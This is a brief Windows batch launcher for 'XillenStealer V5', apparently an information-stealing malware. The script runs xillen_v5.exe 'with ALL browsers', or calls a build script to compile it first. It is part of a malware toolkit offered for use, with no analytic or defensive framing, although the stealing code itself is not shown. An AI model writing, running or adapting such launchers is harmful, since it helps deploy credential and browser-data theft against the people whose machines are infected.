@echo off
chcp 65001 >nul

echo.
echo ════════════════════════════════════════════════════════
echo   XILLENSTEALER V5 - FULL VERSION
echo ════════════════════════════════════════════════════════
echo.

cd /d "%~dp0"

if exist xillen_v5.exe (
    echo [*] Running full version with ALL browsers...
    echo.
    xillen_v5.exe
) else (
    echo [!] xillen_v5.exe not found!
    echo [*] Building first...
    call BUILD_FULL.bat
)

pause
